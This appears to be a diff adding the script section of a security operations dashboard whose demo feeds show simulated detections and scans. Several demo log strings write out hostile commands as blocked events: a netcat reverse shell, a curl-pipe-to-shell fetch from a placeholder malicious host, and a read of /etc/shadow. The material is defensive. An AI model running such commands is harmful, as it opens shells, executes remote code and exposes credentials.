+            <button onclick="clearFeed()" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold rounded-xl transition-all">Clear</button>
+        </div>
+    </div>
+    <div class="space-y-2" id="live-feed-list">
+        <div class="text-xs text-slate-500">Loading events...</div>
+    </div>
+</div>
+
+</main>
+</div>
+
+<script>
+// ── State ─────────────────────────────────────────────────────────────────────
+let allEvents = [];
+let ebpfRunning = false, ebpfInterval = null;
+let ebpfBlocked = 0, ebpfAllowed = 0, ebpfSetuid = 0;
+
+// ── Clock ─────────────────────────────────────────────────────────────────────
+function updateClock() {
+    document.getElementById('utc-clock').textContent =
+        new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';
+}
+setInterval(updateClock, 1000); updateClock();
+
+// ── Tab switching ─────────────────────────────────────────────────────────────
+function switchTab(name) {
+    document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
+    document.querySelectorAll('.tab-btn').forEach(b => {
+        b.classList.remove('active');
+        if (!b.classList.contains('active')) {
+            b.className = b.className.replace('active','').trim();
+            b.classList.add('text-slate-400','hover:text-white','hover:bg-slate-900');
+        }
+    });
+    document.getElementById('pane-' + name).classList.remove('hidden');
+    const btn = document.getElementById('btn-' + name);
+    btn.classList.add('active');
+    btn.classList.remove('text-slate-400','hover:text-white','hover:bg-slate-900');
+}
+
+// ── Charts ────────────────────────────────────────────────────────────────────
+const sevCtx = document.getElementById('severity-chart').getContext('2d');
+const sevChart = new Chart(sevCtx, {
+    type: 'doughnut',
+    data: {
+        labels: ['Critical','High','Medium','Low','Info'],
+        datasets: [{ data:[0,0,0,0,0],
+            backgroundColor:['#f87171','#fb923c','#fbbf24','#34d399','#64748b'],
+            borderWidth:0 }]
+    },
+    options: { responsive:true, maintainAspectRatio:false,
+        plugins:{ legend:{ position:'right', labels:{color:'#94a3b8',font:{size:10},boxWidth:12} } } }
+});
+
+const srcCtx = document.getElementById('source-chart').getContext('2d');
+const srcChart = new Chart(srcCtx, {
+    type: 'bar',
+    data: { labels:[], datasets:[{ label:'Events', data:[],
+        backgroundColor:'rgba(34,211,238,0.3)', borderColor:'#22d3ee',
+        borderWidth:1, borderRadius:4 }] },
+    options: { responsive:true, maintainAspectRatio:false, indexAxis:'y',
+        plugins:{ legend:{display:false} },
+        scales:{ x:{ticks:{color:'#475569',font:{size:9}},grid:{color:'#1e293b'}},
+                 y:{ticks:{color:'#475569',font:{size:9}},grid:{color:'#1e293b'}} } }
+});
+
+// ── Module status grid ────────────────────────────────────────────────────────
+const modules = [
+    { id:'shadow313',      label:'Shadow313 CLI',    icon:'fa-terminal',    color:'cyan',    status:'Online' },
+    { id:'ebpf_monitor',   label:'eBPF Kernel',      icon:'fa-microchip',   color:'green',   status:'Online' },
+    { id:'vsat_scanner',   label:'VSAT Scanner',     icon:'fa-satellite-dish',color:'amber', status:'Online' },
+    { id:'rf_monitor',     label:'RF Monitor',       icon:'fa-wave-square', color:'rose',    status:'Online' },
+    { id:'gnss_monitor',   label:'GNSS Detector',    icon:'fa-location-dot',color:'orange',  status:'Online' },
+    { id:'sovereign_shield',label:'QKD Console',     icon:'fa-atom',        color:'indigo',  status:'Online' },
+    { id:'pqc_auditor',    label:'PQC Auditor',      icon:'fa-shield-halved',color:'violet', status:'Online' },
+    { id:'oncosim',        label:'OncoSim Bio',      icon:'fa-dna',         color:'emerald', status:'Online' },
+];
+
+function buildModuleGrid() {
+    const grid = document.getElementById('module-status-grid');
+    grid.innerHTML = '';
+    modules.forEach(m => {
+        const div = document.createElement('div');
+        div.className = `bg-slate-900 border border-slate-800 rounded-xl p-3 flex items-center gap-3`;
+        div.innerHTML = `
+            <div class="w-8 h-8 bg-slate-800 rounded-lg flex items-center justify-center text-${m.color}-400">
+                <i class="fa-solid ${m.icon} text-xs"></i>
+            </div>
+            <div>
+                <div class="text-xs font-bold text-white">${m.label}</div>
+                <div class="flex items-center gap-1 mt-0.5">
+                    <span class="w-1.5 h-1.5 rounded-full bg-green-400 pulse-dot"></span>
+                    <span class="text-[10px] text-green-400">${m.status}</span>
+                </div>
+            </div>`;
+        grid.appendChild(div);
+    });
+}
+buildModuleGrid();
+
+// ── VSAT remediation status ───────────────────────────────────────────────────
+const vsatItems = [
+    { text:'Port 23 Telnet → SSH Ed25519',        done:false },
+    { text:'Port 21 FTP → SFTP chroot',           done:false },
+    { text:'Port 80 HTTP → HTTPS TLS 1.3',        done:false },
+    { text:'CVE-2026-3392 TR-069 disabled',        done:false },
+    { text:'Unsigned firmware → signature verify', done:false },
+    { text:'UART/JTAG physically secured',         done:false },
+    { text:'SNR/Clock resync GPS/NTP',             done:false },
+];
+function buildVSATRemediation() {
+    const el = document.getElementById('vsat-remediation');
+    el.innerHTML = '';
+    vsatItems.forEach((item, i) => {
+        const div = document.createElement('div');
+        div.className = `flex items-center justify-between p-2 ${item.done ? 'bg-green-500/5 border border-green-500/20' : 'bg-red-500/5 border border-red-500/20'} rounded-lg cursor-pointer`;
+        div.onclick = () => { vsatItems[i].done = !vsatItems[i].done; buildVSATRemediation(); };
+        div.innerHTML = `<span class="text-xs text-slate-300">${item.text}</span>
+            <span class="text-[10px] font-bold ${item.done ? 'text-green-400' : 'text-red-400'}">${item.done ? '✅ DONE' : '⬜ PENDING'}</span>`;
+        el.appendChild(div);
+    });
+}
+buildVSATRemediation();
+
+// ── Load events from bus ──────────────────────────────────────────────────────
+async function loadEvents() {
+    try {
+        const resp = await fetch('http://localhost:8313/api/events?limit=200');
+        if (!resp.ok) throw new Error('Bus offline');
+        const data = await resp.json();
+        allEvents = data.events || [];
+        document.getElementById('bus-status').innerHTML =
+            '<span class="w-2 h-2 rounded-full bg-green-400 pulse-dot"></span> Bus: Online';
+        document.getElementById('bus-status').className =
+            'inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-semibold bg-green-500/10 border border-green-500/20 text-green-400';
+        updateStats();
+        renderCriticalEvents();
+        renderLiveFeed();
+    } catch {
+        // Bus offline — use demo data
+        loadDemoEvents();
+    }
+}
+
+function loadDemoEvents() {
+    allEvents = [
+        { event_id:'s313-001', source:'shadow313',      severity:'CRITICAL', category:'detection', title:'APT29 WMI Persistence', message:'mofcomp.exe from PowerShell — T1546.003', mitre:'T1546.003', timestamp: new Date().toISOString() },
+        { event_id:'ebpf-001', source:'ebpf_monitor',   severity:'CRITICAL', category:'kernel',    title:'Reverse Shell Blocked', message:'nc -lvp 4444 -e /bin/sh intercepted', timestamp: new Date().toISOString() },
+        { event_id:'vsat-001', source:'vsat_scanner',   severity:'CRITICAL', category:'detection', title:'CVE-2026-3392 TR-069',  message:'Unsigned CWMP provisioning accepted', timestamp: new Date().toISOString() },
+        { event_id:'rf-001',   source:'rf_monitor',     severity:'HIGH',     category:'rf',        title:'SNR Critical 5.9 dB',  message:'Below 8.0 dB threshold — OSCILLATOR_DRIFT', timestamp: new Date().toISOString() },
+        { event_id:'gps-001',  source:'gnss_monitor',   severity:'CRITICAL', category:'rf',        title:'GPS Spoofing Detected', message:'9,842 km jump in 1.0s — coherent injection', timestamp: new Date().toISOString() },
+        { event_id:'qkd-001',  source:'sovereign_shield',severity:'CRITICAL',category:'qkd',       title:'QKD QBER 40% — Dropped',message:'BB84 key dropped — eavesdropper detected', timestamp: new Date().toISOString() },
+        { event_id:'pqc-001',  source:'pqc_auditor',    severity:'CRITICAL', category:'detection', title:'RSA-2048 HNDL Risk',    message:'Harvest-Now-Decrypt-Later exposure', timestamp: new Date().toISOString() },
+        { event_id:'onco-001', source:'oncosim',        severity:'HIGH',     category:'oncosim',   title:'C797S Resistance',      message:'EGFR mutation — Gen-4 TKI initiated', timestamp: new Date().toISOString() },
+    ];
+    document.getElementById('bus-status').innerHTML =
+        '<span class="w-2 h-2 rounded-full bg-amber-400 pulse-dot"></span> Bus: Demo Mode';
+    updateStats();
+    renderCriticalEvents();
+    renderLiveFeed();
+}
+
+function updateStats() {
+    const bySev = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,INFO:0};
+    const bySrc = {};
+    allEvents.forEach(e => {
+        bySev[e.severity] = (bySev[e.severity]||0) + 1;
+        bySrc[e.source]   = (bySrc[e.source]||0) + 1;
+    });
+
+    document.getElementById('stat-critical').textContent = bySev.CRITICAL;
+    document.getElementById('stat-high').textContent     = bySev.HIGH;
+    document.getElementById('stat-medium').textContent   = bySev.MEDIUM;
+    document.getElementById('stat-shadow313').textContent= bySrc['shadow313']||0;
+    document.getElementById('stat-ebpf').textContent     = bySrc['ebpf_monitor']||0;
+    document.getElementById('stat-vsat').textContent     = bySrc['vsat_scanner']||0;
+    document.getElementById('total-events-badge').textContent = allEvents.length + ' Events';
+
+    sevChart.data.datasets[0].data = [bySev.CRITICAL,bySev.HIGH,bySev.MEDIUM,bySev.LOW,bySev.INFO];
+    sevChart.update();
+
+    const srcLabels = Object.keys(bySrc);
+    const srcData   = srcLabels.map(k => bySrc[k]);
+    srcChart.data.labels = srcLabels;
+    srcChart.data.datasets[0].data = srcData;
+    srcChart.update();
+
+    if (bySev.CRITICAL > 0) {
+        ['ebpf-badge','vsat-badge','qkd-badge'].forEach(id => {
+            document.getElementById(id)?.classList.remove('hidden');
+        });
+    }
+}
+
+function renderCriticalEvents() {
+    const el = document.getElementById('critical-events-list');
+    const critical = allEvents.filter(e => e.severity === 'CRITICAL' || e.severity === 'HIGH').slice(0,8);
+    el.innerHTML = '';
+    critical.forEach(e => {
+        const div = document.createElement('div');
+        const sevClass = e.severity === 'CRITICAL' ? 'sev-critical' : 'sev-high';
+        div.className = `flex items-start gap-3 p-3 border rounded-xl ${sevClass}`;
+        div.innerHTML = `
+            <span class="text-[10px] font-bold code mt-0.5 shrink-0">${e.severity}</span>
+            <div class="flex-1 min-w-0">
+                <div class="text-xs font-bold text-white truncate">${e.title}</div>
+                <div class="text-[10px] text-slate-400 truncate">${e.message}</div>
+            </div>
+            <span class="text-[10px] text-slate-500 shrink-0 code">${e.source}</span>`;
+        el.appendChild(div);
+    });
+}
+
+function renderLiveFeed() {
+    const srcFilter = document.getElementById('feed-filter-source').value;
+    const sevFilter = document.getElementById('feed-filter-sev').value;
+    let events = allEvents;
+    if (srcFilter) events = events.filter(e => e.source === srcFilter);
+    if (sevFilter) events = events.filter(e => e.severity === sevFilter);
+
+    const el = document.getElementById('live-feed-list');
+    el.innerHTML = '';
+    events.slice(0,50).forEach(e => {
+        const div = document.createElement('div');
+        const sevClass = {CRITICAL:'sev-critical',HIGH:'sev-high',MEDIUM:'sev-medium',LOW:'sev-low',INFO:'sev-info'}[e.severity]||'sev-info';
+        div.className = `log-entry flex items-start gap-3 p-3 border rounded-xl ${sevClass}`;
+        div.innerHTML = `
+            <span class="text-[10px] font-bold code mt-0.5 shrink-0 w-16">${e.severity}</span>
+            <div class="flex-1 min-w-0">
+                <div class="text-xs font-bold text-white">${e.title}</div>
+                <div class="text-[10px] text-slate-400">${e.message}</div>
+                ${e.mitre ? `<span class="text-[9px] code text-cyan-400">${e.mitre}</span>` : ''}
+            </div>
+            <div class="text-right shrink-0">
+                <div class="text-[10px] text-slate-500 code">${e.source}</div>
+                <div class="text-[9px] text-slate-600">${(e.timestamp||'').slice(11,19)}</div>
+            </div>`;
+        el.appendChild(div);
+    });
+}
+
+function filterFeed() { renderLiveFeed(); }
+function clearFeed() {
+    document.getElementById('live-feed-list').innerHTML = '<div class="text-xs text-slate-500">Feed cleared.</div>';
+}
+
+// ── Shadow313 demo ────────────────────────────────────────────────────────────
+const aptLines = [
+    { cls:'text-slate-400', t:'[Shadow313] Running APT29 attack simulation against DEMO-WORKSTATION-01...' },
+    { cls:'text-yellow-400',t:'[APT29] Stage 1: mofcomp.exe executed from PowerShell (T1546.003)' },
+    { cls:'text-red-400',   t:'[NEXUS ML] CRITICAL: WMI MOF compilation — anomaly score 0.910' },
+    { cls:'text-yellow-400',t:'[APT29] Stage 2: WMI repository write detected (Event 11)' },
+    { cls:'text-red-400',   t:'[NEXUS ML] CRITICAL: WMI persistence established — score 0.856' },
+    { cls:'text-yellow-400',t:'[APT29] Stage 3: Jittered C2 beacon (3 pulses, ~30s interval)' },
+    { cls:'text-red-400',   t:'[NEXUS ML] HIGH: C2 beacon pattern — score 0.799' },
+    { cls:'text-yellow-400',t:'[APT29] Stage 4: LSASS memory access (T1003.001)' },
+    { cls:'text-red-400',   t:'[NEXUS ML] CRITICAL: Credential dump — score 0.857' },
+    { cls:'text-green-400', t:'[SOAR] Credential dump → forcing password rotation' },
+    { cls:'text-green-400', t:'[SOAR] WMI persistence → purging subscriptions, blocking mofcomp.exe' },
+    { cls:'text-green-400', t:'[SOAR] C2 beacon → blocking outbound, capturing PCAP' },
+    { cls:'text-green-400', t:'[SOAR] Audit trail sealed — SHA-256 chain VALID' },
+    { cls:'text-cyan-400',  t:'[Shadow313] Detection rate: 100% | SOAR: 4 actions | 262ms avg' },
+];
+
+function runAttackDemo() {
+    const log = document.getElementById('shadow313-log');
+    log.innerHTML = '';
+    aptLines.forEach(({cls,t}, i) => {
+        setTimeout(() => {
+            const div = document.createElement('div');
+            div.className = `log-entry ${cls}`;
+            div.textContent = `[${new Date().toISOString().slice(11,19)}] ${t}`;
+            log.appendChild(div);
+            log.scrollTop = log.scrollHeight;
+        }, i * 400);
+    });
+}
+
+// ── eBPF monitor ──────────────────────────────────────────────────────────────
+const ebpfEvents = [
+    { cls:'text-red-400',   t:'[CRITICAL] BLOCKED: nc -lvp 4444 -e /bin/sh (execve intercepted)', blocked:true },
+    { cls:'text-red-400',   t:'[CRITICAL] BLOCKED: curl http://malicious.com/payload.sh | sh', blocked:true },
+    { cls:'text-red-400',   t:'[CRITICAL] BLOCKED: cat /etc/shadow (openat intercepted)', blocked:true },
+    { cls:'text-red-400',   t:'[CRITICAL] BLOCKED: bash setuid(0) — T1548.001 privilege escalation', blocked:true, setuid:true },
+    { cls:'text-green-400', t:'[INFO] ALLOWED: sudo apt-get update (execve — whitelisted)', blocked:false },
+    { cls:'text-green-400', t:'[INFO] ALLOWED: sshd clone SIGCHLD (normal connection)', blocked:false },
+    { cls:'text-green-400', t:'[INFO] ALLOWED: nginx accept4 192.168.1.55:53299', blocked:false },
+    { cls:'text-amber-400', t:'[WARN] ALLOWED: sshd setuid(0) — whitelisted process', blocked:false },
+];
+
+function startEBPFStream() {
+    if (ebpfRunning) {
+        clearInterval(ebpfInterval);
+        ebpfRunning = false;
+        document.getElementById('ebpf-btn').innerHTML = '<span class="w-2 h-2 rounded-full bg-white pulse-dot"></span> Start Monitor';
+        return;
+    }
+    ebpfRunning = true;
+    document.getElementById('ebpf-btn').innerHTML = '<span class="w-2 h-2 rounded-full bg-red-400 pulse-dot"></span> Stop Monitor';
+    document.getElementById('ebpf-badge').classList.remove('hidden');
+
+    ebpfInterval = setInterval(() => {
+        const ev = ebpfEvents[Math.floor(Math.random() * ebpfEvents.length)];
+        const log = document.getElementById('ebpf-log');
+        const div = document.createElement('div');
+        div.className = `log-entry ${ev.cls} code text-xs`;
+        div.textContent = `[${new Date().toISOString().slice(11,19)}] ${ev.t}`;
+        log.appendChild(div);
+        log.scrollTop = log.scrollHeight;
+
+        if (ev.blocked) ebpfBlocked++;
+        else ebpfAllowed++;
+        if (ev.setuid) ebpfSetuid++;
+
+        document.getElementById('ebpf-blocked').textContent = ebpfBlocked;
+        document.getElementById('ebpf-allowed').textContent = ebpfAllowed;
+        document.getElementById('ebpf-setuid').textContent  = ebpfSetuid;
+        document.getElementById('ebpf-eps').textContent     = Math.floor(Math.random()*8)+2;
+    }, 1500);
+}
+
+// ── VSAT sweep ────────────────────────────────────────────────────────────────
+const vsatLines = [
+    { cls:'text-slate-400', t:'[*] Target: 192.168.100.0/24 | Profile: DEEP' },
+    { cls:'text-green-400', t:'[+] Host 192.168.100.1  — VSAT Modulator Hub' },
+    { cls:'text-green-400', t:'[+] Host 192.168.100.15 — NOC Console' },
+    { cls:'text-red-400',   t:'[!!!] Port 21 FTP: OPEN — Anonymous write enabled!' },
+    { cls:'text-red-400',   t:'[!!!] Port 23 Telnet: OPEN — Cleartext credentials!' },
+    { cls:'text-red-400',   t:'[!!!] Port 80 HTTP: OPEN — Unencrypted admin panel!' },
+    { cls:'text-green-400', t:'[✓]  Port 161 SNMP: SNMPv3 enforced — SECURE' },
+    { cls:'text-red-400',   t:'[!!!] CVE-2026-3392: Unsigned CWMP accepted — VULNERABLE!' },
+    { cls:'text-red-400',   t:'[!!!] Unsigned firmware accepted — partition overwrite risk!' },
+    { cls:'text-red-400',   t:'[!!!] UART/JTAG unauthenticated — device registers readable!' },
+    { cls:'text-red-400',   t:'[!!!] SNR: 5.9 dB — CRITICAL (threshold: 8.0 dB)' },
+    { cls:'text-red-400',   t:'[!!!] Clock Skew: +55.1 Hz — CRITICAL (threshold: ±10 Hz)' },
+    { cls:'text-cyan-400',  t:'[✓]  Sweep complete. 7 critical findings.' },
+];
+
+function runVSATSweep() {
+    const log = document.getElementById('vsat-log');
+    log.innerHTML = '';
+    vsatLines.forEach(({cls,t}, i) => {
+        setTimeout(() => {
+            const div = document.createElement('div');
+            div.className = `log-entry ${cls} code text-xs`;
+            div.textContent = `[${new Date().toISOString().slice(11,19)}] ${t}`;
+            log.appendChild(div);
+            log.scrollTop = log.scrollHeight;
+        }, i * 300);
+    });
+    document.getElementById('vsat-badge').classList.remove('hidden');
+}
+
+// ── Init ──────────────────────────────────────────────────────────────────────
+loadEvents();
+setInterval(loadEvents, 30000);
+</script>
+</body>
+</html>
